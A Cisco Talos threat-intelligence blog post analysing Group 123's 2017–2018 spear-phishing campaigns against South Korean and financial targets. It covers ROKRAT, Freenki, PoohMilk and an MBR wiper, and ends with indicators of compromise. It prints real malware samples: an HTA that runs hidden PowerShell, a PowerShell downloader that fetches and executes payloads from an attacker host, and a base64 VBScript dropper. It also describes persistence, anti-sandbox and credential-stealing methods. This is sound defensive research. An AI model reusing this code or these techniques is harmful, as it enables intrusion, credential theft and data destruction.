{
    "title": "talos blog __ cisco talos intelligence group - comprehensive threat intelligence_ korea in the crosshairs",
    "text": " Subscribe via EmailTUESDAY, JANUARY 16, 2018\nThis blog post is authored by Warren Mercer  and Paul Rascagneres  and with contributions from Jungsoo An.\nA one year review of campaigns performed by an actor with multiple campaigns mainly linked to South Korean\ntargets.\nThis article exposes the malicious activities of Group 123 during 2017. We assess with high confidence that\nGroup 123 was responsible for the following six campaigns:\n\"Golden Time\" campaign.\n\"Evil New Year\" campaign.\n\"Are you Happy?\" campaign.\n\"FreeMilk\" campaign.\n\"North Korean Human Rights\" campaign.\n\"Evil New Year 2018\" campaign.\nOn January 2nd of 2018, the \"Evil New Year 2018\" was started. This campaign copies the approach of the 2017\n\"Evil New Year\" campaign.\nThe links between the different campaigns include shared code and compiler artifacts such as PDB (Program\nDataBase) patterns which were present throughout these campaigns.\nBased on our analysis, the \"Golden Time\", both \"Evil New Year\" and the \"North Korean Human Rights\"\ncampaigns specifically targeted South Korean users. The attackers used spear phishing emails combined with\nmalicious HWP documents created using Hancom Hangul Office Suite. Group 123 has been known to use\nexploits (such as CVE-2013-0808) or scripting languages harnessing OLE objects. The purpose of the malicious\ndocuments was to install and to execute ROKRAT, a remote administration tool (RAT). On occasion the\nattackers directly included the ROKRAT payload in the malicious document and during other campaigns the\nattackers leveraged multi-stage infection processes: the document only contained a downloader designed to\ndownload ROKRAT from a compromised web server.\nAdditionally, the \"FreeMilk\" campaign targeted several non-Korean financial institutions. In this campaign, the\nattackers made use of a malicious Microsoft Office document, a deviation from their normal use of Hancom\ndocuments. This document exploited a newer vulnerability, CVE-2017-0199. Group 123 used this vulnerability\nless than one month after its public disclosure. During this campaign, the attackers used 2 different malicious\nbinaries: PoohMilk and Freenki. PoohMilk exists only to launch Freenki. Freenki is used to gather information\nabout the infected system and to download a subsequent stage payload. This malware was used in several\ncampaigns in 2016 and has some code overlap with ROKRAT.\nFinally, we identified a 6th campaign that is also linked to Group 123. We named this 6th campaign \"Are You\nHappy?\". In this campaign, the attackers deployed a disk wiper. The purpose of this attack was not only to gain\naccess to the remote infected systems but to also wipe the first sectors of the device. We identified that the\nwiper is a ROKRAT module.\nThis actor was very active this year and continued to mainly focus on South Korea. The group leveraged spear\nphishing campaigns and malicious documents the contents of which included very specific language\nsuggesting that they were crafted by native Korean speakers rather than through the use of translation\nservices. The actor has the following demonstrated capabilities:\nTo include exploits (for Hangul and Microsoft Office) in its workflows.\nTo modify its campaigns by splitting the payload in to multiple stages\nTo use compromised web servers or legitimate cloud based platforms.\nTo use HTTPS communications to make it harder to perform traffic analysis.\nTo compromise third parties to forge realistic spear phishing campaigns (i.e. Yonsei university in\nthe \"Golden Time\" campaign).\nTo constantly evolve, the new fileless capability included in 2018 is a proof.\nHere is the timeline for 2017 and the beginning of 2018: Korea In The Crosshairs\nEXECUTIVE SUMMARY\nTHE TIMELINE\nSearch Blog\nSUBSCRIBE TO OUR FEED\n Posts\n Comments\n►  2020 (61)\n►  2019 (277)\n▼  2018 (198)\n►  DECEMBER (16)\n►  NOVEMBER (15)\n►  OCTOBER (26)\n►  SEPTEMBER (16)\n►  AUGUST (12)\n►  JULY (20)\n►  JUNE (15)\n►  MAY (15)\n►  APRIL (21)\n►  MARCH (10)\n►  FEBRUARY (14)\n▼  JANUARY (18)\nRansom Where? Malicious\nCryptocurrency Miners Take...\n2017 in Snort Rules\nBeers with Talos EP 21: How to Hire the\nBest, Attr...\nVulnerability Spotlight: Walt Disney Per-\nFace Text...\nSamSam - The Evolution Continues\nNetting Over $325...\nThe Many Tentacles of the Necurs Botnet\nBeers with Talos EP20: Crypto, Vuln\nDisco, and the...\nVulnerability Spotlight: Tinysvcmdns\nMulti-label D...\nKorea In The Crosshairs\nThreat Round Up for January 5 - 12\nVulnerability Spotlight: Multiple\nUnpatched Vulner...\nVulnerability Spotlight: Ruby Rails Gem\nXSS Vulner...\nMicrosoft Patch Tuesday - January 2018\nVulnerability Spotlight: Multiple\nVulnerabilities ...\nMeltdown and Spectre\nThreat Round Up for December 29 -\nJanuary 5\nNot So Crystal Clear - Zeus Variant Spoils\nUkraini...\nTutorial: Mutiny Fuzzing Framework and\nDecept Prox...\n►  2017 (171)\n►  2016 (98)\n►  2015 (62)\n►  2014 (67)\n►  2013 (30)\n►  2012 (53)\n►  2011 (23)\n►  2010 (93)\n►  2009 (146)\n►  2008 (37)BLOG ARCHIVE\nRECOMMENDED BLOGS\nCISCO BLOG\nMore Than a Beard\nSNORT BLOG\nSnort rule update for March 10, 2020 —\nMicrosoft Patch Tuesday\nCLAMAV® BLOG\nClamAV Bugzilla Upgrade Software  Vulnerability  Information  Reputation  Center  Library  Support  Careers  Blog  Podcasts  About\n As with the majority of Group 123 campaigns, the initial attack vector during this campaign was spear phishing.\nTalos identified two different kinds of emails. The first email we discovered was the most interesting. In this\nsample, we observed the attackers praising the user for joining a panel related to the \"Korean Reunification and\nNorth Korean Conference\". The text in the email explained that the recipient should complete the attached\ndocument to provide necessary feedback. This appears to be a non-existent conference. The closest match\nwe identified related to any Unification conference was held in January 2017, which was the NYDA\nReunification conference. The sender was 'kgf2016@yonsei.ac.kr' which is the contact email of the Korea\nGlobal Forum, a separate conference. \nWhen we analyzed the email headers, we determined that the email was sent from an SMTP server using an IP\nassociated with the Yonsei University network. We believe that the email address was compromised and\nabused by the attackers to send the email used in this campaign. \nThe filename for the malicious attachment translates as 'Unification North Korea Conference _ Examination\nDocuments' which reinforces the text in the email about the reunification conference. For an added bonus, in\nthe body of the email, the attacker even suggests that people who completed the document would get paid a\n'small fee'. Perhaps the gift of embedded malware is the payment:\nMuch less effort was used to craft the second email Talos analyzed. The email was from a free Korean mail\nservice provided by Daum, Hanmail, indicating that there was no attempt to try to appear as if it originated from\nan official body or person, unlike the previous email described. The subject was simply 'Request Help' while the\nattachment filename was 'I'm a munchon person in Gangwon-do, North Korea'. We suspect the attacker was\ntrying to generate sympathy by reminding the reader that Munchon and the province it is in, Kangwon, were part\nof a unified province that included South Korea's Gangwon-do prior to the division of Korea in 1945.\nA second email contained a story about a person called 'Ewing Kim' who was looking for help:\nThe email's attachments are two different HWP documents, both leveraging same vulnerability (CVE-2013-\n0808). This vulnerability targets the EPS (Encapsulated PostScript) format. The purpose of the shellcode is to\ndownload a payload from the Internet. The first email displays the following decoy document to the infected\nuser and download the following payload:\nhxxp://discgolfglow[.]com:/wp-content/plugins/maintenance/images/worker.jpg\nThe second email displays the following decoy document to the infected user and downloads the following\npayload:\nhxxp://acddesigns[.]com[.]au/clients/ACPRCM/kingstone.jpg\nAUGUST 2016 TO MARCH 2017: \"GOLDEN TIME\" CAMPAIGN\n In both cases, the downloaded payload is the ROKRAT malware.\nThe first tasks of this variant of ROKRAT is to check the operating system version. If Windows XP is detected,\nthe malware executes an infinite loop. The purpose is to generate empty reports if opened on sandbox systems\nrunning Windows XP machines. Additionally it checks to determine if common analysis tools are currently\nrunning on the infected system. If it detects the presence of these tools, the malware performs two network\nrequests to legitimate websites:\nhxxps://www[.]amazon[.]com/Men-War-PC/dp/B001QZGVEC/EsoftTeam/watchcom.jpg\nhxxp://www[.]hulu[.]com/watch/559035/episode3.mp4\nThe Amazon URL displays a WWII game called 'Men of War' while the Hulu URL attempts to stream a\nJapanese anime show called 'Golden Time':\nOne of the identifying characteristics of ROKRAT is the fact that it uses social network and cloud platforms to\ncommunicate with the attackers. These platforms are used to exfiltrate documents and receive instructions.\nHere is a list of the platforms used by this variant: Twitter, Yandex and Mediafire. The tokens for each platform\nare hardcoded within the sample:\nIn the early part of 2017, Group123 started the \"Evil New Year\" campaign. In this campaign the actors tried to\nfool victims by pretending the emails were from the Korean Ministry of Unification and that they offered Korean-\nspecific analysis. This campaign began with a handful of spear phishing emails to South Korean targets and\ncontaining malicious attachments. Group123 further attempted to entice victims to open the attachments by\nusing common Hancom Hangul documents. Hancom's Hangul is a popular Office Suite used primarily in the\nKorean peninsula. The use of Hangul office documents has the advantage of being the norm for the Korean\npeninsula. If the attacker used Microsoft documents, it may have raised suspicions in the victim. Given the\nregional file format used there is a chance that some security software suites may not handle them well, and\nthis may have provided an evasion case for the attacker.\nThe documents sent to the targets were titled \"Analysis of \"Northern New Year in 2017\" and used the official\nlogo of the Korean Ministry of Unification. This is a simple choice for the actor to make, but it further shows\ntheir familiarity with the region. \nNOVEMBER 2016 TO JANUARY 2017: \"EVIL NEW YEAR\" CAMPAIGN\n The document claimed to discuss the New Year's activities of North Korea and this would have been\nsomething that the victims in South Korea would be very interested in. This would have been particularly true\nfor Government targets, who we believe to be Group123's target of choice. \nThis document was a decoy aimed to entice the user to open malicious documents embedded further down\nthe page\nThe actor embedded two additional links and the document urged the user to click on these links for more\ninformation about New Year's activities in North Korea. The first link was labeled as \"Comparison of Major\nTasks in '16 & '17\" and the second link was identified as \"Comparison between '16 & '17\".\nUpon opening these links the user was presented with a further decoy Hangul document. This document was\nwell written and further increases our confidence that we are dealing with a new Korean actor. These\ndocuments contained malicious OLE objects used to drop binaries.\nThis time, however, they contained malicious OLE (Object Link Embedded) objects.\nInitial analysis confirmed two similarly sized OLE object files within this document which appeared to be the\nsame from an execution point of view.\nThe two dropped binaries were stored and executed in this location during our analysis:\nC:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\Hwp (2).exe\nC:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\Hwp (3).exe\nInitial analysis showed some sloppy cleaning up from Group123, which we used later to determine that\nseparate campaigns were the work of this same actor, as compilation artifacts remained within the binaries:\ne:\\Happy\\Work\\Source\\version 12\\T+M\\Result\\DocPrint.pdb\nThe second stage of the dropped binaries was used to execute wscript.exe while injecting shellcode into this\nprocess. The shellcode is embedded within the resource 'BIN' and is used to unpack another PE32 binary and\nuse wscript.exe to execute it. To do this, Group123 uses a well-known technique that harnesses\nVirtualAllocEx(), WriteProcessMemory() and CreateRemoteThread() Windows API calls.\nThe new PE32 unpacked from the shellcode is an initial reconnaissance malware which is used to\ncommunicate with the C2 infrastructure to obtain the final payload. The information this malware collected\nincluded the following:\nThe computer name\nThe username\nThe execution path of the sample\nThe BIOS model\nA randomly-generated ID to uniquely identify the system\nGroup123 utilized this method to ensure their victim was (a) someone they wanted to target further and (b)\n someone they could infect further based on the information obtained from the reconnaissance phase. \nFurther network analysis showed that the binary attempted to connect to the following URLs:\nwww[.]kgls[.]or[.]kr/news2/news_dir/index.php\nwww[.]kgls[.]or[.]kr/news2/news_dir/02BC6B26_put.jpg\nKorean Government Legal Services (KGLS) is a legitimate Korean government body that manages Korean\ngovernment legal affairs. By compromising the KGLS, the attacker gained a trusted platform from which to\nexecute an attack.\nThe initial network connection is to 'index.php'. This connection transmits the information gathered during the\nreconnaissance phase. The attacker uses this information to then determine the specific filename (based on\nthe random ID) to serve to the infected victim. In our case this was 02BC6B26 - this meant a file\n\"02BC6B26_put.jpg\" was created for us on the attackers C2. This file is then dropped and renamed\n'officepatch.exe' on the victim's machine. Because the attacker was careful about who they attacked, we were\nunable to obtain this file during our analysis.\nDuring our investigation we were able to identify additional Command and Control infrastructure used by this\nactor. Four C2s were observed, based in the following countries:\n3 C2 in South Korea\n1 C2 in the Netherlands\nHere is a global map of the identified infrastructure:\nContrary to the previous campaign, the attackers separated the reconnaissance phase from the main ROKRAT\npayload. This trick was likely used to avoid detection. This is an interesting adaptation in Group 123's behavior.\nIn March 2017, Group 123 compiled a disk wiper. The malware contains 1 function, the purpose is to open the\ndrive of the infected system (\\\\.\\PhysicalDrive0) and write the following data to the MBR:\nYou can see the \"Are you Happy?\" string in the written buffer. After writing to the MBR, the malware reboots the\nmachine with the following command: c:\\windows\\system32\\shutdown /r /t 1\nAfter the reboot, the MBR displays the following string to the user:\nThe link to the other campaigns was the following PDB path:\nD:\\HighSchool\\version 13\\VC2008(Version15)\\T+M\\T+M\\TMProject\\Release\\ErasePartition.pdb\nAs you can see, it perfectly matches the ROKRAT PDB. This wiper is a ROKRAT module named ERSP.enc. We\nassume that ERSP means ERaSePartition. This module can be downloaded and executed on demand by Group\n123.\nThis sample is interesting considering the attack in December 2014 against a Korean power plant where the\nmessage that was displayed by the wiper was \"Who Am I?\".\nThis campaign targeted non-Korean financial institutions, but unlike the other campaigns, this one does not use\nHWP documents. It instead uses Office documents. This change is because Group 123 did not target South\nKorea during this campaign and Microsoft Office is standard in the rest of the world.\nThe attackers exploited CVE-2017-0199 in order to download and execute a malicious HTA document inside of\nMicrosoft Office. The URL used can be found in the embedded OLE object:\nMARCH 2017: \"ARE YOU HAPPY?\" CAMPAIGN\nMAY 2017: \"FREEMILK\" CAMPAIGN\nInfection Vectors\n hxxp://old[.]jrchina[.]com/btob_asiana/udel_calcel.php?fdid=[base64_data]\nHere is the source code of the downloaded HTA document:\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"  \n\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\n<head>\n<meta content=\"text/html; charset=utf-8\" http-equiv=\"Content-Type\" />\n<title>Bonjour</title>\n<script language=\"VBScript\">\nSet owFrClN0giJ = CreateObject(\"Wscript.Shell\")\nSet v1ymUkaljYF = CreateObject(\"Scripting.FileSystemObject\")\nIf v1ymUkaljYF.FileExists(owFrClN0giJ.ExpandEnvironmentStrings(\"%PSModulePath%\") +  \n\"..\\powershell.exe\") Then\nowFrClN0giJ.Run \"powershell -nop -windowstyle hidden -executionpolicy bypass -\nencodedcommand JABjAD0AbgBlAHcALQBvA[...redacted...]H0AIAA=\" ,0\nowFrClN0giJ.Run \"cmd /c echo hta>%tmp%\\webbrowser1094826604.tmp\", 0\nEnd If\nSelf.Close\n</script>\n<hta:application\nid=\"oHTA\"\napplicationname=\"Bonjour\"\napplication=\"yes\"\n>\n</head>\n</html>\nOnce decoded using the base64 algorithm, we are able to read the final payload:\n$c=new-object System.Net.WebClient\n$t =$env:temp\n$t1=$t+\"\\\\alitmp0131.jpg\"\n$t2=$t+\"\\\\alitmp0132.jpg\"\n$t3=$t+\"\\\\alitmp0133.js\"\ntry\n  {\n    echo $c.DownloadFile( \"hxxp://old[.]jrchina[.]com/btob_asiana/appach01.jpg\",$t1)\n    $c.DownloadFile( \"hxxp://old[.]jrchina[.]com/btob_asiana/appach02.jpg\",$t2)\n    $c.DownloadFile( \"hxxp://old[.]jrchina[.]com/btob_asiana/udel_ok.ipp\",$t3)\n    wscript.exe $t3\n  }\ncatch\n  { \n  }\nThe purpose of this script is to download and execute a Windows script and two encoded payloads. The script\nis used to decode and execute the following payloads:\nAppach01.jpg (renamed: Windows-KB275122-x86.exe) is a Freenki sample.\nAppach01.jpg (renamed: Windows-KB271854-x86.exe) is a PoohMilk sample.\nThe PoohMilk sample is designed to perform two actions:\nCreate persistence to execute the Freenki sample at the next reboot.\nCheck specific files on the infected machine.\nThe first action is to create a registry key in order to execute the Windows-KB275122-x86.exe file previously\ndownloaded. The file is executed with the argument: \"help\". Here is the registry creation:\nThe registry location where persistence is achieved is:\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Update. At the next reboot, the malware\nwill be executed.\nThe second action is to check if the file \"wsatra.tmp\" exists in the temporary directory of the current user. If\nthis file exists, the content is read in order to obtain a path to find a second file with the LNK (link) extension.\nThe LNK file is finally used to identify a third file: a ZIP file. The file will be inflated in order to retrieve a RTF\ndocument, this document will be displayed to the infected user by executing Wordpad.\nHere is the PDB path from the PoohMilk sample:\nE:\\BIG_POOH\\Project\\milk\\Release\\milk.pdb\nThe purpose of Freenki is to collect information on the infected system and to download a third executable. PoohMilk Analysis\nFreenki Sample\n This sample can be executed with 3 different arguments:\n\"Help\": the value configured by PoohMilk. In this context the main function is executed.\n\"Console\": with the argument, a persistence is configured and the malware will be executed at the\nnext reboot ( HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\runsample ).\n\"Sample\": with this argument, the malware executes the console command followed by the help\ncommand.\nThe information collected is performed using WMI queries:\nAdditionally the malware lists the running process via the Microsoft Windows API. The malware uses\nobfuscation in order to hide strings such as URL or User-Agent, the algorithm is based on bitwise (SUB 0x0F\nXOR 0x21), here is the decoded data:\nhxxp://old[.]jrchina[.]com/btob_asiana/udel_confirm.php\nMozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET\nCLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; Tablet PC 2.0; .NET4.0E;\nInfoPath.3)\nThe downloaded third payload is obfuscated using the same technique. The file is a fake image starting with\n\"PNGF\".\nIn November 2017, Talos observed the latest Group123 campaign of the year, which included a new version of\nROKRAT being used in the latest wave of attacks. Group 123 again used one of their main calling cards, the\nmalicious HWP document. This time, Group 123 used a document containing information in relation to a\nmeeting held on 1st November in Seoul, South Korea. This document was alleged to have been written by a\nlegal representative claiming to be representing the \"Citizens' Alliance For North Korean Human Rights And\nReunification Of Korean Peninsula\". Group 123 once again uses information related to the Korean unification\nand now are claiming to highlight concerns related to human rights issues. \nThe document brought Talos a new gift - a new version of ROKRAT. Following on with the normal Group 123\nactivity the document was written in perfect Korean text and dialect again suggesting the origin of this group is\nfrom the Korean peninsula.\nFurther analysis of the document text allowed us to understand the context. The document mentions\n'Community of North Korean human rights and unification' with the lawyer claiming to be part of the \"Citizen's\nAlliance for North Korean Human Rights and North-South unification\". The main purpose of this document was\nan attempt to arrange a meeting to discuss items related to \"North Korean Human Rights Act\" and \"Enactment\nof a Law\" which was passed in 2016 in South Korea. We believe that the document was attempting to target\nstakeholders within the ' 올인통 ' community in an attempt to entice them to join the discussion in an attempt to\nwork on additional ideas related to these activities. The meeting was due to take place on November 1, 2017\nand this document was trying to garner additional interest prior to the meeting.\nOnce again Group 123 leveraged the use of OLE objects within the HWP document. Analysis starts with a zlib\ndecompression (a standard action of HWP documents) and we're able to recover the following script:\nconst strEncode =  \n\"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6AAA\nAA4fug4AtAnNIbgBTM0hV[...redacted...]AAAAAAAAAAAAAAAAAAAAAA=\"\nDIM outFile\nDIM base64Decoded\nDIM shell_obj\nSET shell_obj = CreateObject(\"WScript.Shell\")\nDIM fso\nSET fso = CreateObject(\"Scripting.FileSystemObject\")\noutFile = \"c:\\ProgramData\\HncModuleUpdate.exe\"\nbase64Decoded = decodeBase64(strEncode)\nIF NOT(fso.FileExists(outFile)) then\nwriteBytes outFile, base64Decoded\nshell_obj.run outFile\nEND IF\nWScript.Quit()\nNOVEMBER 2017: \"NORTH KOREAN HUMAN RIGHTS\" CAMPAIGN\n private function decodeBase64(base64)\nDIM DM, EL\nSET DM = CreateObject(\"Microsoft.XMLDOM\")\nSET EL = DM.createElement(\"tmp\")\nEL.DataType = \"bin.base64\"\nEL.Text = base64\ndecodeBase64 = EL.NodeTypedValue\nend function\nprivate Sub writeBytes(file, bytes)\nDIM binaryStream\nSET binaryStream = CreateObject(\"ADODB.Stream\")\nbinaryStream.Type = 1\nbinaryStream.Open\nbinaryStream.Write bytes\nbinaryStream.SaveToFile file, 1\nEnd Sub\nThis script is executed and is used to decode a static base64 string within the strEncode variable. Using\nbase64 encoding the decoded binary is stored as HncModuleUpdate.exe and is then executed. This is the\nROKRAT dropper. Talos suspect the filename may have been selected to make it appear within running\nprocesses as a potential Hancom updater.\nThe dropper is used to extract a new resource named SBS. This specific resource contains malicious shellcode\nused by the malware. Additionally we see a cmd.exe process launched and used for process injection using the\nVirtualAlloc(), WriteProcessMemory() and CreateRemoteThread() Windows APIs, as with the first finding of\nROKRAT they continue to use similar Windows APIs. The following graph view from IDA shows these steps.\nThese execution steps allow the launch of the new ROKRAT variant by decoding the PE binary and injecting into\nthe cmd.exe process. \nOne of Group 123 oddities in this campaign was to drop the following picture as a decoy image to the user. This\nimage shows various publicly available images which look to be related to the Korean 'Independence\nMovement' and appear to be related to the Korean war.\nWe began performing further in-depth analysis on this new version of ROKRAT and this is where we started to\nnotice some similarities with Group 123s \"Evil New Years\" campaign. The similitudes are discussed later in this\npaper.\nThis ROKRAT variant contained anti-sandbox techniques. This is performed by checking if the following libraries\nare loaded on the victim machine.\nSbieDll.dll (sandboxie library)\nDbghelp.dll (Microsoft debugging tools)\nApi_log.dll (threatAnalyzer / GFI SandBox)\nDir_watch.dll (threatAnalyzer / GFI SandBox)\n We were able to uncover some other techniques used by this variant of ROKRAT to make analysis difficult,\nGroup 123 used an anti-debugging technique related to NOP (No Operation).\nnop dword ptr [eax+eax+00h] is a 5 byte NOP. But this opcode is not correctly supported by some debugging\ntools, Immunity Debugger for example, will replace the assembly by \"???\" in red making it difficult to attempt to\ndebug.\nThis version of ROKRAT came with a Browser Stealer mechanism which was similar, with a few modifications,\nto that used in the FreeMilk campaign using Freenki malware in 2016.\nGroup 123 continued their use of Cloud platforms with this campaign, this time leveraging pCloud, Dropbox, Box\nand Yandex.\nFinally here is the PDB of the sample used during this campaign: \nd:\\HighSchool\\version 13\\2ndBD\\T+M\\T+M\\Result\\DocPrint.pdb\nAs we observed at the beginning of 2017, Group 123 started a campaign corresponding with the new year in\n2018. This campaign started on the 2nd of January. The infection vector was a malicious HWP document:\nThis decoy document is an analysis of the 2018 New Year speech made by the leader of North Korea. The\napproach is exactly the same as what was seen in 2017 using a new decoy document. This document was\nalleged to have been written by the Ministry of Reunification as demonstrated by the logo in the top left.\nSimilar to the \"Golden Time\" campaign, this document exploits an EPS vulnerability in order to download and\nexecute shellcode located on a compromised website:\nhxxp://60chicken[.]co[.]kr/wysiwyg/PEG_temp/logo1.png\nThe fake image usage is a common pattern for this group. This image contains shellcode used to decode the\nembedded final payload: ROKRAT. This ROKRAT variant is loaded from memory. It's a fileless version of\nROKRAT. This behavior shows that Group 123 is constantly evolving to avoid detection. As usual, the ROKRAT\nsample uses cloud providers to communicate with the operator, this time leveraging Yandex, pCloud, Dropbox\nand Box.\nTalos has identified that Group 123 shares code between different malware. Several features are shared in the\nsamples mentioned in this article; however we will cover only two in this article: the reconnaissance phase and\nthe browsers stealer.\nThe ROKRAT samples used during the two \"Evil New Year\" and the \"North Korean Human Rights\" campaigns\ncontained a reconnaissance phase. In the \"Evil New Year\" campaign the payload was split into two parts, the\nfirst part contained the reconnaissance code. In the other campaign the reconnaissance phase was directly\nincluded in the main payload. This code is the same. \nThe malware uses the following registry key to get the machine type:\nHKLM\\System\\CurrentControlSet\\Services\\mssmbios\\Data\\SMBiosData. The \"System manufacturer\" value is\nused to identify the type of machine. The code appears to be based on a forum post (rohitab.com) describing\nthe use of the Win32 APIs used. The source code only considers the following machine types:\nJANUARY 2018: \"EVIL NEW YEAR 2018\" CAMPAIGN\nLINKS BETWEEN CAMPAIGNS\nCode Sharing\nRECONNAISSANCE PHASE\n default:   lpString = \"(Other)\";               break;\ncase 0x02: lpString = \"(Unknown)\";             break;\ncase 0x03: lpString = \"(Desktop)\";             break;\ncase 0x04: lpString = \"(Low Profile Desktop)\"; break;\ncase 0x06: lpString = \"(Mini Tower)\";          break;\ncase 0x07: lpString = \"(Tower)\";               break;\ncase 0x08: lpString = \"(Portable)\";            break;\ncase 0x09: lpString = \"(Laptop)\";              break;\ncase 0x0A: lpString = \"(Notebook)\";            break;\ncase 0x0E: lpString = \"(Sub Notebook)\";        break;\nThe string format - with the () - and the considering types are exactly the same as those used in the ROKRAT\nsamples.\nIt's interesting to note that this reconnaissance phase was not included in the ROKRAT variant used during the\n\"Golden Time\" campaign.\nFor the first time, the ROKRAT sample used during the \"North Korean Human Rights\" contained a browser\ncredentials stealer. The code used to perform this task in the same that found within in a Freenki sample\ndeployed in 2016.\nThe malware is able to extract the stored passwords from Internet Explorer, Chrome and Firefox. For Chrome\nand Firefox, the malware queries the sqlite database containing the URL, username and password:\nAdditionally, they support the Microsoft Vault mechanism. Vault was implemented in Windows 7, it contains any\nsensitive data (like the credentials) of Internet Explorer. Here is the initialization of the Vault APIs:\nOn the left, we have the ROKRAT sample and on the right the FreeMilk sample. You can see that in addition to\nthe code, the author copy-pasted English typos such as \"IE Registery\":\nWe can clearly identify a pattern in the PDB naming convention of all the binaries mentioned in this article.\nROKRAT:\ne:\\Happy\\Work\\Source\\version 12\\T+M\\Result\\DocPrint.pdb (from the \"Evil New Year\" campaign)\nd:\\HighSchool\\version 13\\2ndBD\\T+M\\T+M\\Result\\DocPrint.pdb (from the \"North Korean Human\nRights\" campaign\nD:\\HighSchool\\version 13\\First-Dragon(VS2015)\\Sample\\Release\\DogCall.pdb (ROKRAT Sample\nfrom an unidentified campaign from June)\nWiper:BROWER STEALER\nPDB Paths\n D:\\HighSchool\\version 13\\VC2008(Version15)\\T+M\\T+M\\TMProject\\Release\\ErasePartition.pdb\n(From the \"Are You Happy?\" campaign)\nHere is a graph to visualize the similarities and differences between each campaign mentioned in this article:\nSouth Korea is becoming an important target for malicious actors and the techniques used are becoming\nspecific to the region (for example: use of native language to try and ensure the targets feel that the\ninformation, document or email being sent to them has added legitimacy). In a specific campaign, this actor\ntook time to compromise multiple legitimate Korean platforms including Yonsei and the KGLS in order to forge\nthe spear phishing campaign or to host the command and control. This approach is not common with less\nadvanced actors and demonstrates a high level of maturity and knowledge of the Korean region.\nHowever Group 123's activities are not limited to South Korea. For international targets, they are able to switch\nto a more standard attack vector such as using Microsoft Office documents as opposed to the specific HWP\ndocuments used when targeting victims located in Korea. Group 123 does not hesitate to use public exploits\nand scripting languages to drop and execute malicious payloads. We can notice that this group uses\ncompromised legitimate websites (mainly Wordpress) and cloud platforms to communicate with the infected\nsystems. This approach makes it difficult to detect communications through analysis of these network flows.\nEven if the arsenal of this actor is diverse, we have identified some patterns, copy-paste code from various\npublic repositories and similarities between the different piece of code. In addition to the Remote\nAdministration Tools, we identified a wiper. We conclude that this group was involved in a campaign of\nintelligence gathering and finally attempted destruction.\nWith our current knowledge of this actor, we predict that they will not disappear anytime soon and will continue\nto be active during the coming years. Group 123 is constantly evolving as the new fileless capability that was\nadded to ROKRAT demonstrates. We also believe their target profile may change but for now it will mostly\nfocus on Korean peninsula targets, however, as explained their capabilities will likely continue to evolve over\ntime as they further refine their TTPs.\nMaldoc #1 sha256: 7d163e36f47ec56c9fe08d758a0770f1778fa30af68f39aac80441a3f037761e\nMaldoc #2 sha256: 5441f45df22af63498c63a49aae82065086964f9067cfa75987951831017bd4f\nROKRAT #1: cd166565ce09ef410c5bba40bad0b49441af6cfb48772e7e4a9de3d646b4851c\nROKRAT #1: 051463a14767c6477b6dacd639f30a8a5b9e126ff31532b58fc29c8364604d00\nNetwork:\nMalicious URLs:\n- hxxp://discgolfglow[.]com/wp-content/plugins/maintenance/images/worker.jpg\n- hxxp://acddesigns[.]com[.]au/clients/ACPRCM/kingstone.jpg\nSafe URLs:\n- hxxps://www[.]amazon[.]com/Men-War-PC/dp/B001QZGVEC/EsoftTeam/watchcom.jpg\n- hxxp://www[.]hulu[.]com/watch/559035/episode3.mp4\nMaldoc sha256: 281828d6f5bd377f91c6283c34896d0483b08ac2167d34e981fbea871893c919\nDropped #1: 95192de1f3239d5c0a7075627cf9845c91fd397796383185f61dde893989c08a\nDropped #2: 7ebc9a1fd93525fc42277efbccecf5a0470a0affbc4cf6c3934933c4c1959eb1\nDropped #3: 6c372f29615ce8ae2cdf257e9f2617870c74b321651e9219ea16847467f51c9f\nDropped #4: 19e4c45c0cd992564532b89a4dc1f35c769133167dc20e40b2a41fccb881277b\nDropped #5: 3a0fc4cc145eafe20129e9c53aac424e429597a58682605128b3656c3ab0a409\nDropped #6: 7d8008028488edd26e665a3d4f70576cc02c237fffe5b8493842def528d6a1d8\nUnpacked #1: 7e810cb159fab5baccee7e72708d97433d92ef6d3ef7d8b6926c2df481ccac2f\nUnpacked #1: 21b098d721ea88bf237c08cdb5c619aa435046d9143bd4a2c4ec463dcf275cbe\nUnpacked #1: 761454dafba7e191587735c0dc5c6c8ab5b1fb87a0fa44bd046e8495a27850c7\nUnpacked #1: 3d442c4457cf921b7a335c0d7276bea9472976dc31af94ea0e604e466596b4e8\nUnpacked #1: 930fce7272ede29833abbfb5df4e32eee9f15443542434d7a8363f7a7b2d1f00\nUnpacked #1: 4b20883386665bd205ac50f34f7b6293747fd720d602e2bb3c270837a21291b4\nUnpacked #1: f080f019073654acbe6b7ab735d3fd21f8942352895890d7e8b27fa488887d08\nNetwork:\n- www[.]imuz[.]com/admin/data/bbs/review2/board/index.php\n- www[.]imuz[.]com/admin/data/bbs/review2/board/123.php\n- www[.]imuz[.]com/admin/data/bbs/review2/board/02BC6B26_put.jpg (where 02BC6B26 is randomly\ngenerated)\n- www[.]wildrush[.]co[.]kr/bbs/data/image/work/webproxy.php\n- www[.]wildrush[.]co[.]kr/bbs/data/image/work/02BC6B26_put.jpg (where 02BC6B26 is randomly generated)\n- www[.]belasting-telefoon[.]nl//images/banners/temp/index.php\n- www[.]belasting-telefoon[.]nl//images/banners/temp/02BC6B26_put.jpg (where 02BC6B26 is randomly\ngenerated)\n- www[.]kgls[.]or[.]kr/news2/news_dir/index.php\n- www[.]kgls[.]or[.]kr/news2/news_dir/02BC6B26_put.jpg (where 02BC6B26 is randomly generated)\nWiper sha256: 6332c97c76d2da7101ad05f501dc1188ac22ce29e91dab6d0c034c4a90b615bd\nOffice sha256: f1419cde4dd4e1785d6ec6d33afb413e938f6aece2e8d55cf6328a9d2ac3c2d0\nHTA sha256: a585849d02c94e93022c5257b162f74c0cdf6144ad82dd7cf7ac700cbfedd84f\nJS sha256: 1893af524edea4541c317df288adbf17ae4fcc3a30d403331eae541281c71a3c\nPoohMilk sha256: 